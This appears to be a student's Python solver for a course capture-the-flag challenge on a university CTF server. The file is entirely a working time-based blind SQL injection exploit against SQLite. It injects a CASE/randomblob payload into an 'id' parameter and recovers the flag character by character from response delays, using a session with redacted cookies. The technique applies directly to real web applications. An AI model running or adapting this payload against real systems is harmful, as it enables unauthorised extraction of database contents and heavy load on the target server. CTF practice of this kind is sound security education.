import requests
import time

url = 'http://cs2107-ctfd-i.comp.nus.edu:5005/'
flag_length = 26
flag = ''
delay_threshold = 3

auth_token_name = 'auth_token'
auth_token_value = """AUTH TOKEN REDACTED"""

session_cookie_name = 'session'
session_cookie_value = """SESSION COOKIE REDACTED"""

session = requests.Session()
session.cookies.set(auth_token_name, auth_token_value)
session.cookies.set(session_cookie_name, session_cookie_value)

charset = '!_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}'

for i in range(1, flag_length + 1):
    for char in charset:
        ascii_value = ord(char)
        payload = f"?id=1 AND (SELECT CASE WHEN (SELECT unicode(substr(flag,{i},1)) FROM flag)={ascii_value} THEN randomblob(1000000000) ELSE NULL END)"
        start_time = time.time()
        response = session.get(url + payload)
        end_time = time.time()

        response_time = end_time - start_time

        if response.status_code == 200 and response_time >= delay_threshold:
            flag += chr(ascii_value)
            print(f"Current flag: {flag}")
            break

print(f"Final flag: {flag}")
